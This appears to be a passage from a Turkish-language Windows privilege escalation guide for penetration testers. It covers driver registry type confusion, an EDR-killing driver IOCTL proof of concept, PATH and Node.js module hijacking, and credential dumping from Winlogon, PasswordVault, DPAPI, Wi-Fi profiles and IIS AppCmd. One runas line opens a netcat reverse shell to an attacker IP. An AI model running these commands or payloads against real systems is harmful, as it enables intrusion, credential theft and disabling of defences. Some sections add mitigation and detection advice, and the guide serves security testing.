Modern hive güvenlik açıkları, deterministik bellek düzenleri oluşturmanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve özel bir driver olmadan metadata bozulmasını kernel paged-pool taşmalarına dönüştürmenize olanak tanır. Zincirin tamamını burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırganın denetimindeki yollar üzerinden `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver'lar userland'den bir registry yolu kabul eder, yalnızca bunun geçerli bir UTF-16 dizisi olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` işlevini `int readValue` gibi bir stack scalar'ına `RTL_QUERY_REGISTRY_DIRECT` ile çağırır. `RTL_QUERY_REGISTRY_TYPECHECK` eksikse `EntryContext`, geliştiricinin beklediği türe göre değil, registry'deki **gerçek** türe göre yorumlanır.

Bu, kullanılabilir iki primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcının denetimindeki mutlak bir `\Registry\...` yolu, driver'ın saldırganın seçtiği anahtarları sorgulamasına, dönüş kodları/loglar üzerinden anahtarların varlığını sızdırmasına ve bazen çağıranın doğrudan erişemeyeceği değerleri okumasına olanak tanır.
- **Kernel bellek bozulması**: `&readValue` gibi bir scalar hedef, registry değerinin türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış bir binary buffer olarak type confusion'a uğrar.

Pratik istismar notları:

- **Windows 8+ azaltımı**: Sorgu, `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullanarak **güvenilmeyen bir hive**'a erişirse kernel çağrıları `KERNEL_SECURITY_CHECK_FAILURE (0x139)` hatasıyla çöker. İstismar edilebilirliği korumak için `HKCU` altında değerler hazırlamak yerine **güvenilir sistem hive'ları içindeki saldırgan tarafından yazılabilir anahtarları** arayın.
- **Güvenilir hive'da hazırlık**: `\Registry\Machine` altındaki yazılabilir alt anahtarları listelemek için NtObjectManager kullanın ve sandbox ortamlarından erişilebilen anahtarları bulmak için taramayı kopyalanmış bir **düşük bütünlük düzeyli** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte bir `int` değişkenine doğrudan 8-byte yazılması, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`'in bir `UNICODE_STRING`'i göstermesini bekler. Kod önce saldırganın kontrolündeki bir `REG_DWORD` değerini stack'teki bir skaler değişkene yükler ve ardından aynı buffer'ı string okumak için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkileyerek kısmen kontrol edilebilir bir kernel write elde eder.
- **`REG_BINARY`**: Büyük binary verilerde direct mode, `EntryContext`'teki ilk `LONG` değerini işaretli bir buffer boyutu olarak ele alır. Önceki bir `REG_DWORD` okuması, yeniden kullanılan skalere saldırganın kontrol ettiği **negatif** bir değer bırakırsa sonraki `REG_BINARY` sorgusu, saldırganın baytlarını doğrudan bitişik stack slot'larının üzerine kopyalar. Bu, callback-pointer'ın tamamen üzerine yazmak için çoğu zaman en temiz yoldur.

Güçlü bir arama örüntüsü: **aynı stack değişkenine, yeniden başlatmadan yapılan farklı türlerde registry okumaları**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry okumasının ikinci okumanın gerçekleşip gerçekleşmeyeceğini kontrol ettiği kod yolları için grep yapın.

#### Device object'lerde FILE_DEVICE_SECURE_OPEN eksikliğini kötüye kullanma (LPE + EDR kill)

Bazı imzalı üçüncü taraf sürücüler, güçlü bir SDDL ile IoCreateDeviceSecure kullanarak device object'lerini oluşturur, ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarlamayı unutur. Bu flag olmadığında, device fazladan bir bileşen içeren bir path üzerinden açıldığında secure DACL uygulanmaz; böylece ayrıcalıksız herhangi bir kullanıcı şu tür bir namespace path kullanarak handle alabilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir örnek)

Kullanıcı device'ı açabildiğinde, sürücünün sunduğu ayrıcalıklı IOCTL'ler LPE ve kurcalama için kötüye kullanılabilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- Rastgele process'lere tam erişimli handle'lar döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser aracılığıyla SYSTEM shell).
- Kısıtlamasız ham disk okuma/yazma (çevrimdışı kurcalama, boot-time persistence hileleri).
- Protected Process/Light (PP/PPL) dahil rastgele process'leri sonlandırma; böylece AV/EDR kill işlemini user land üzerinden kernel aracılığıyla gerçekleştirme.

Minimal PoC örüntüsü (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Geliştiriciler için azaltma önlemleri
- DACL ile kısıtlanması amaçlanan device object'leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. İşlem sonlandırmaya veya handle döndürmeye izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri kısıtlayın (erişim maskeleri, METHOD_*, girdi doğrulaması) ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Savunmacılar için tespit fikirleri
- Şüpheli device name'lerine (ör. \\ .\\amsdk*) yönelik user-mode açma işlemlerini ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) zorunlu kılın ve kendi izin/verme listelerinizi tutun.


## PATH DLL Hijacking

**PATH üzerinde bulunan bir klasörde yazma izinleriniz** varsa, bir process tarafından yüklenen DLL'yi ele geçirerek **ayrıcalıklarınızı yükseltebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bu kontrolün nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron modül çözümleme hijacking'i

Bu, `require("foo")` gibi yalın bir import yaptıklarında ve beklenen modül **bulunamadığında** **Node.js** ve **Electron** uygulamalarını etkileyen bir **Windows denetimsiz arama yolu** çeşididir.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows'ta bu arama sürücünün kök dizinine kadar ulaşabilir. Bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şu yolları kontrol edebilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya paket klasörü) yerleştirip **daha yüksek ayrıcalıklı bir Node/Electron işleminin** bulunamayan bağımlılığı çözümlemesini bekleyebilir. Payload, kurban işlemin güvenlik bağlamında çalıştırılır. Bu nedenle hedef bir yönetici olarak, yükseltilmiş zamanlanmış görev/hizmet sarmalayıcısı üzerinden veya otomatik başlatılan ayrıcalıklı bir masaüstü uygulaması olarak çalıştığında bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu hallerde yaygındır:

- bir bağımlılık `optionalDependencies` içinde tanımlandığında<sup>[[22]](#references)</sup>
- üçüncü taraf bir kütüphane `require("foo")` çağrısını `try/catch` içine alıp hata durumunda çalışmaya devam ettiğinde
- bir paket production derlemelerinden kaldırıldığında, paketleme sırasında dahil edilmediğinde veya yüklemesi başarısız olduğunda
- güvenlik açığı bulunan `require()` çağrısı ana uygulama kodunda değil, bağımlılık ağacının derinliklerinde bulunduğunda

### Güvenlik açığı bulunan hedefleri arama

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` = hedef yürütülebilir dosya (`node.exe`, Electron uygulamasının EXE dosyası veya sarmalayıcı işlemi) olacak şekilde filtreleyin
- `Path` `contains` `node_modules` olacak şekilde filtreleyin
- `NAME NOT FOUND` kayıtlarına ve `C:\node_modules` altındaki son başarılı açma işlemine odaklanın

Paketlenmemiş `.asar` dosyalarında veya uygulama kaynaklarında işe yarayan kod inceleme örüntüleri:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon veya kaynak incelemesiyle **eksik paket adını** belirleyin.
2. Henüz mevcut değilse root lookup dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Beklenen adla tam olarak eşleşen bir modül bırakın:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül mevcut değilse Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu örüntüye uyan, gerçek dünyada karşılaşılan eksik isteğe bağlı modüller arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan kısım **tekniktir**: ayrıcalıklı bir Windows Node/Electron sürecinin çözümleneceği herhangi bir **eksik bare import** bulun.

### Tespit ve güçlendirme fikirleri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya buraya yeni `.js` dosyaları/paketleri yazdığında uyarı verin.
- `C:\node_modules\*` konumundan okuma yapan yüksek bütünlüklü süreçleri araştırın.
- Üretimde tüm runtime bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarda sessiz `try { require("...") } catch {}` örüntülerini inceleyin.
- Kütüphane destekliyorsa isteğe bağlı kontrolleri devre dışı bırakın (örneğin, bazı `ws` dağıtımları `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` kontrolünü önleyebilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyası

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **kısıtlı hizmetleri** kontrol edin

```bash
netstat -ano #Opened ports?
```

Yerel bir listener için PID'yi işlemin sahibi, çalıştırılabilir dosyanın yolu ve onu başlatan service veya scheduled task ile ilişkilendirin. Bir remote-control service, yalnızca kimlik doğrulama ve komut denetimleri buna izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklara sahip bir hesapla çalışan özel bir TCP uygulaması ayrı bir inceleme hedefidir: listener ve binary path pasif ipuçlarıdır; kimliği doğrulanmış bir memory-corruption yolu ise tam olarak bu binary'nin ve erişilebilir girdisinin analiz edilmesini gerektirir. Açık bir port sistem sürecine ait görünüyorsa backend service'i atfetmeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) çıktısıyla karşılaştırın; tek başına bir yönlendirme kuralı, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall Kuralları

[**Firewall ile ilgili komutlar için bu sayfayı kontrol edin**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

[Ağ keşfi için daha fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

`bash.exe` ikili dosyası `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

root kullanıcısını elde ederseniz herhangi bir portu dinleyebilirsiniz (`nc.exe` ile bir portu ilk kez dinlemeye çalıştığınızda, GUI üzerinden `nc`'ye güvenlik duvarı tarafından izin verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` hesabı, tek başına Windows Administrator hakları vermez. Geçerli Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutlar için (`/root/.bash_history` dahil) shell history dosyalarını inceleyin. Yetki yükseltme için yine de daha yüksek ayrıcalıklara sahip geçerli bir hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` yapısı eski WSL kurulumları için geçerlidir; WSL 2'de dağıtım genellikle bir [`ext4.vhdx` sanal diskinde](https://learn.microsoft.com/en-us/windows/wsl/disk-space) saklanır. Bu nedenle önce kullanılan dağıtımı ve depolama yolunu belirleyin. Otomatik enumeration sırasında history içeriğini ekrana yazdırmaktan kaçının.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgileri değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, kayıt defterinde düz metin olarak bulunan bir bulgudur. `AutoAdminLogon=1` ise ancak okunabilir düz metin parola yoksa, bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı LSA secret olarak saklayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve kayıt defterini sıradan şekilde okumak, bu secret'ın var olup olmadığını veya alınabilir olup olmadığını ortaya koymaz. Bir kimlik bilgisinin açığa çıktığını bildirmeden önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Kimlik Bilgileri Yöneticisi / Windows vault

Şu kaynaktan: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault; **Windows**'un kullanıcıları **otomatik olarak oturum açtırmak** için kullanabileceği sunuculara, web sitelerine ve diğer programlara ait kimlik bilgilerini saklar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi sitelerin kimlik bilgilerini saklayıp tarayıcıların otomatik olarak oturum açmasını sağlayabileceği anlamına geliyor gibi görünebilir, ancak sistem böyle çalışmaz.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırmak için kullanabileceği kimlik bilgilerini saklar. Bu da bir kaynağa (sunucu veya web sitesi) erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir **Windows uygulamasının** bu **Kimlik Bilgileri Yöneticisi** ve Windows Vault'u kullanabileceği ve kullanıcılara sürekli kullanıcı adı ile parola girmek yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Kimlik Bilgileri Yöneticisi ile etkileşim kurmadığı sürece, belirli bir kaynağa ait kimlik bilgilerini kullanabileceklerini sanmıyorum. Dolayısıyla uygulamanız vault'u kullanmak istiyorsa, varsayılan depolama vault'undan **bu kaynağa ait kimlik bilgilerini istemek için kimlik bilgileri yöneticisiyle iletişim kurmalıdır**.

Makinede saklanan kimlik bilgilerini listelemek için `cmdkey` kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Ardından, kaydedilmiş kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir ikili dosyayı çağırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

`runas` komutunu sağlanan kimlik bilgileri kümesiyle kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) üzerinden de kullanılabileceğini unutmayın.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama belirteçlerini ve düz metin parolaları, Universal Windows Platform (UWP) `PasswordVault` içinde saklar. Bu alan, `vaultcmd` içinde `Web Credentials` olarak da görüntülenir. Bu depolama alanı oturumlara özeldir ve yönetici veya `SeDebugPrivilege` hakları olmadan yerel olarak çözülebilir.

Saklanan tüm kullanıcı adlarını ve düz metin parolaları anında dökmek ve çözmek için bu PowerShell komutunu kullanıcının etkin oturumunda çalıştırın:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sunar ve Windows işletim sisteminde çoğunlukla asimetrik özel anahtarların simetrik şifrelenmesinde kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunması için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi senaryolarında, sistemin etki alanı kimlik doğrulama sırlarından yararlanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. Burada `{SID}`, kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil eder. **Kullanıcının özel anahtarlarını koruyan ana anahtarla aynı dosyada bulunan DPAPI anahtarı**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'de `dir` komutuyla listelenemediğini, ancak PowerShell üzerinden listelenebildiğini unutmayın.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Bunu çözmek için uygun argümanlarla (`/pvk` veya `/rpc`) **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**Master password** tarafından korunan kimlik bilgisi dosyaları genellikle şurada bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Şifreyi çözmek için uygun `/masterkey` ile **mimikatz module** `dpapi::cred` kullanabilirsiniz.\
`sekurlsa::dpapi` module ile **memory**'den birçok DPAPI **masterkeys** **çıkarabilirsiniz** (root iseniz).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri**, şifrelenmiş kimlik bilgilerini kullanışlı bir şekilde saklamak amacıyla **scripting** ve otomasyon görevlerinde sıkça kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları bilgisayardaki aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Dışa aktarılan bir kimlik bilgisi, rastgele bir dosya adına veya `.xml` yoluna sahip olabilir. Bir betik veya dosya envanteri böyle bir dosyaya işaret ettiğinde, `C:\Users` varsaymak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir kimlik bilgisini dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve kurtarılan herhangi bir hesabın hedef hizmette ayrıca geçerli yetkilere sahip olması gerekir. Rutin envanter çıkarma sırasında şifrelenmiş veya düz metin değerleri görüntülemeden önce yolları ve ACL'leri inceleyin.

Bir dosyada bulunan PS kimlik bilgilerinin **şifresini çözmek** için şunu kullanabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers` konumlarında bulabilirsiniz.

### Son Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use the **Mimikatz** `dpapi::rdg` module with the appropriate `/masterkey` to **decrypt any .rdg files**\
Mimikatz `sekurlsa::dpapi` module ile bellekten **çok sayıda DPAPI masterkey çıkarabilirsiniz**

**mRemoteNG farklı bir connection store kullanır.** `%APPDATA%\mRemoteNG` ve kullanıcının Documents dizinindeki okunabilir XML dosyalarını, `config.xml` gibi sıradan adlara sahip dosyalar da dahil olmak üzere inceleyin. Bir XML dosyasını kimlik bilgisi adayı olarak değerlendirmeden önce connection şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer bir DPAPI/RDCMan parolası değildir; kurtarma, dosyanın encryption ayarlarına ve özel bir master password kullanılıp kullanılmadığına bağlıdır. Geniş kapsamlı arama sırasında şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profile exports** kullanıcı dizinlerinde veya paylaşılan bir yönetim klasöründe okunabilir durumda olabilir. Eski bir `profiles.xml` export dosyasında `ProfileName`, `Password` ve `Secure` öğelerini içeren `Data/Profile` girdileri bulunur. Boş olmayan bir password öğesini kimlik bilgisi adayı olarak değerlendirin; değerleri yazdırmayın veya plaintext olduklarını varsaymayın: [vendor notes](https://www.donkz.nl/), profil korumasının oluşturan hesaba ve bilgisayara bağlanabileceğini veya daha gevşek biçimde yapılandırılabileceğini belirtiyor. Bu dosyaya güvenmeden önce kaynağını ve kurtarma koşullarını doğrulayın.

### Sticky Notes

İnsanlar Windows iş istasyonlarında StickyNotes uygulamasını sıklıkla **parolaları** ve diğer bilgileri **kaydetmek** için kullanır; bunun bir veritabanı dosyası olduğunu fark etmez. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumundadır ve her zaman aranıp incelenmeye değerdir.

İnsanlar bazen yapışkan not uygulamalarına parola ve diğer bilgileri kaydeder. Microsoft'un paketlenmiş Sticky Notes uygulaması genellikle notları `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; eski veya farklı uygulamalar LevelDB dahil başka kullanıcı profili depolarını kullanabilir. Eksik bir SQLite dosyasını notların yokluğuna kanıt saymadan önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes SQLite write-ahead logging kullanıyorsa, yalnızca `plum.sqlite` dosyasının bir kopyası yakın zamanda commit edilmiş notları içermeyebilir. Veritabanının tutarlı bir kopyasını alırken eşleşen `plum.sqlite-wal` dosyasını da saklayın ve varsa `plum.sqlite-shm` dosyasını da dahil edin; shared-memory index yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. Bkz. [SQLite's WAL documentation](https://www.sqlite.org/wal.html). Hesap adı veya parola içeren bir not yalnızca bir kimlik bilgisi adayıdır: hesabı, izin verilen erişimi ve parola tekrar kullanımını ayrıca doğrulayın. Şifrelenmiş bir password-manager kaydının daha yüksek ayrıcalıklı bir oturum açmayı kanıtlayabilmesi için ayrıca gerçek decryption key ve uygulamaya özgü yorumlama gerekir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity düzeyinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa bazı **kimlik bilgileri** yapılandırılmış ve **kurtarılabilir** olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) kaynağından alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
